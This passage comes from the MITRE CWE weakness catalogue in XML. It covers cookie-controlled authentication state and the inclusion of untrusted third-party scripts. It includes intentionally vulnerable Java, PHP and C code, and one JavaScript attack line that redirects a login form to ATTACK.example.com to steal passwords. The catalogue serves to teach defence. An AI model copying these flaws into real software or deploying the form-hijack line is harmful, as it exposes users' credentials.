               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Store state information and sensitive data on the server side only.</xhtml:p>
                  <xhtml:p>Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.</xhtml:p>
                  <xhtml:p>If information must be stored on the client, do not do so without encryption and integrity checking, or otherwise having a mechanism on the server side to catch tampering. Use a message authentication code (MAC) algorithm, such as Hash Message Authentication Code (HMAC) [REF-529]. Apply this against the state or sensitive data that you has to be exposed, which can guarantee the integrity of the data - i.e., that the data has not been modified. Ensure that a strong hash function is used (CWE-328).</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.2">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>With a stateless protocol such as HTTP, use a framework that maintains the state for you.</xhtml:p>
                  <xhtml:p>Examples include ASP.NET View State [REF-756] and the OWASP ESAPI Session Management feature [REF-45].</xhtml:p>
                  <xhtml:p>Be careful of language features that provide state support, since these might be provided as a convenience to the programmer and may not be considering security.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</xhtml:p>
                  <xhtml:p>Identify all inputs that are used for security decisions and determine if you can modify the design so that you do not have to rely on submitted inputs at all. For example, you may be able to keep critical information about the user's session on the server side instead of recording it within external data.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-15">
               <Intro_Text>The following code excerpt reads a value from a browser cookie to determine the role of the user.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Cookie[] cookies = request.getCookies();<xhtml:br/>for (int i =0; i&lt; cookies.length; i++) {<xhtml:div style="margin-left:1em;">Cookie c = cookies[i];<xhtml:br/>if (c.getName().equals("role")) {<xhtml:div style="margin-left:1em;">userRole = c.getValue();</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-16">
               <Intro_Text>The following code could be for a medical records application. It performs authentication by checking if a cookie has been set.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$auth = $_COOKIES['authenticated'];<xhtml:br/>if (! $auth) {<xhtml:div style="margin-left:1em;">if (AuthenticateUser($_POST['user'], $_POST['password']) == "success") {<xhtml:div style="margin-left:1em;">// save the cookie to send out in future responses<xhtml:br/>setcookie("authenticated", "1", time()+60*60*2);</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:1em;">ShowLoginScreen();<xhtml:br/>die("\n");</xhtml:div>}</xhtml:div>}<xhtml:br/>DisplayMedicalHistory($_POST['patient_ID']);</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer expects that the AuthenticateUser() check will always be applied, and the "authenticated" cookie will only be set when authentication succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie.</Body_Text>
               <Body_Text>However, the attacker can set the "authenticated" cookie to a non-zero value such as 1. As a result, the $auth variable is 1, and the AuthenticateUser() check is not even performed. The attacker has bypassed the authentication.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-17">
               <Intro_Text>In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Cookie[] cookies = request.getCookies();<xhtml:br/>for (int i =0; i&lt; cookies.length; i++) {<xhtml:div style="margin-left:1em;">Cookie c = cookies[i];<xhtml:br/>if (c.getName().equals("authenticated") &amp;&amp; Boolean.TRUE.equals(c.getValue())) {<xhtml:div style="margin-left:1em;">authenticated = true;</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-93">
               <Intro_Text>The following code samples use a DNS lookup in order to decide whether or not an inbound request is from a trusted host. If an attacker can poison the DNS cache, they can gain trusted status.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>struct hostent *hp;struct in_addr myaddr;<xhtml:br/>char* tHost = "trustme.example.com";<xhtml:br/>myaddr.s_addr=inet_addr(ip_addr_string);<xhtml:br/>
                     <xhtml:br/>hp = gethostbyaddr((char *) &amp;myaddr, sizeof(struct in_addr), AF_INET);<xhtml:br/>if (hp &amp;&amp; !strncmp(hp-&gt;h_name, tHost, sizeof(tHost))) {<xhtml:div style="margin-left:1em;">trusted = true;</xhtml:div>} else {<xhtml:div style="margin-left:1em;">trusted = false;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String ip = request.getRemoteAddr();<xhtml:br/>InetAddress addr = InetAddress.getByName(ip);<xhtml:br/>if (addr.getCanonicalHostName().endsWith("trustme.com")) {<xhtml:div style="margin-left:1em;">trusted = true;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="C#">
                  <xhtml:div>IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress);<xhtml:br/>IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress);<xhtml:br/>if (hostInfo.HostName.EndsWith("trustme.com")) {<xhtml:div style="margin-left:1em;">trusted = true;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-1549</Reference>
               <Description>Attacker can bypass authentication by setting a cookie to a specific value.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1549</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1619</Reference>
               <Description>Attacker can bypass authentication and gain admin privileges by setting an "admin" cookie to 1.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1619</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0864</Reference>
               <Description>Content management system allows admin privileges by setting a "login" cookie to "OK."</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0864</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5784</Reference>
               <Description>e-dating application allows admin privileges by setting the admin cookie to 1.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5784</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6291</Reference>
               <Description>Web-based email list manager allows attackers to gain admin privileges by setting a login cookie to "admin."</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6291</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SEC09-J</Entry_ID>
               <Entry_Name>Do not base security checks on untrusted sources</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-754"/>
            <Reference External_Reference_ID="REF-529"/>
            <Reference External_Reference_ID="REF-756"/>
            <Reference External_Reference_ID="REF-45"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2010-01-18</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="829" Name="Inclusion of Functionality from Untrusted Control Sphere" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product imports, requires, or includes executable functionality (such as a library) from a source that is outside of the intended control sphere.</Description>
         <Extended_Description>
            <xhtml:p>When including third-party functionality, such as a web widget, library, or other source of functionality, the product must effectively trust that functionality. Without sufficient protection mechanisms, the functionality could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). The functionality might also contain its own weaknesses, or grant access to additional functionality and state information that should be kept private to the base system, such as system state information, sensitive application data, or the DOM of a web application.</xhtml:p>
            <xhtml:p>This might lead to many different consequences depending on the included functionality, but some examples include injection of malware, information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware (CWE-601).</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>An attacker could insert malicious functionality into the program by causing the program to download code that the attacker has placed into the untrusted control sphere, such as a malicious web site.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Forced Path Execution</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Attack Modeling</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21.1">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>
                  <xhtml:p>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</xhtml:p>
                  <xhtml:p>For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5.1">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434.</xhtml:p>
                  <xhtml:p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-34">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.</xhtml:p>
                  <xhtml:p>This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</xhtml:p>
                  <xhtml:p>Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-94">
               <Intro_Text>This login webpage includes a weather widget from an external website:</Intro_Text>
               <Example_Code Nature="Bad" Language="HTML">
                  <xhtml:div>&lt;div class="header"&gt; Welcome!<xhtml:div style="margin-left:1em;">&lt;div id="loginBox"&gt;Please Login:<xhtml:div style="margin-left:1em;">&lt;form id ="loginForm" name="loginForm" action="login.php" method="post"&gt;<xhtml:br/>Username: &lt;input type="text" name="username" /&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>Password: &lt;input type="password" name="password" /&gt;<xhtml:br/>&lt;input type="submit" value="Login" /&gt;<xhtml:br/>&lt;/form&gt;</xhtml:div>&lt;/div&gt;<xhtml:br/>&lt;div id="WeatherWidget"&gt;<xhtml:div style="margin-left:1em;">&lt;script type="text/javascript" src="externalDomain.example.com/weatherwidget.js"&gt;&lt;/script&gt;</xhtml:div>&lt;/div&gt;</xhtml:div>&lt;/div&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79).</Body_Text>
               <Body_Text>For example, user login information could easily be stolen with a single line added to weatherwidget.js:</Body_Text>
               <Example_Code Nature="Attack" Language="JavaScript">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>...Weather widget code....</xhtml:i>
                     <xhtml:br/>document.getElementById('loginForm').action = "ATTACK.example.com/stealPassword.php";</xhtml:div>
               </Example_Code>
               <Body_Text>This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2010-2076</Reference>
               <Description>Product does not properly reject DTDs in SOAP messages, which allows remote attackers to read arbitrary files, send HTTP requests to intranet servers, or cause a denial of service.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-2076</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0285</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0285</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0030</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0030</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0068</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0068</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2157</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2157</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2162</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2162</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2198</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2198</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0128</Reference>
               <Description>Modification of assumed-immutable variable in configuration script leads to file inclusion.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0128</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1864</Reference>
               <Description>PHP file inclusion.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1864</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1869</Reference>
               <Description>PHP file inclusion.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1869</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1870</Reference>
               <Description>PHP file inclusion.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1870</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2154</Reference>
               <Description>PHP local file inclusion.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2154</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1704</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1704</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1707</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1707</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1964</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1964</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1681</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1681</Link>
            </Observed_Example>
            <Observed_Example>
